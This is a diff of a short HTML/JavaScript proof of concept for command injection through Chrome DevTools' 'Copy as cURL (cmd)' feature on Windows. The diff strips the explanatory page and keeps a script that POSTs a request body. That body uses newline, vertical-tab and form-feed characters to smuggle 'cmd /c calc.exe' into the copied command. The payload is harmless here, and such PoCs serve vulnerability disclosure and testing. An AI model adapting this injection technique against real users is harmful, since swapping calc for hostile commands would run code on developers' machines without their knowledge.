@@ -1,26 +1,15 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Chrome DevTools Copy as cURL (cmd) PoC</title>
-</head>
-<body>
-  <h2>Chrome DevTools Copy as cURL (cmd) – Windows PoC</h2>
-  <p>Click the button, then copy the request from DevTools.</p>
+<script>
+function run() {
+  const payload =
+    "A\ncmd /c calc.exe" +
+    String.fromCharCode(0x0b) +
+    "\ncmd /c calc.exe" +
+    String.fromCharCode(0x0c);
 
-  <button onclick="run()">Send PoC Request</button>
-
-  <script>
-    function run() {
-      fetch("/copyme", {
-        method: "POST",
-        headers: {
-          "Content-Type": "text/plain"
-        },
-        body: "A\ncmd /c calc.exe\x0b\ncmd /c calc.exe\x0c"
-      });
-      alert("Request sent. Open DevTools → Network → copyme");
-    }
-  </script>
-</body>
-</html>
+  fetch("/copyme", {
+    method: "POST",
+    headers: { "Content-Type": "text/plain" },
+    body: payload
+  });
+}
+</script>
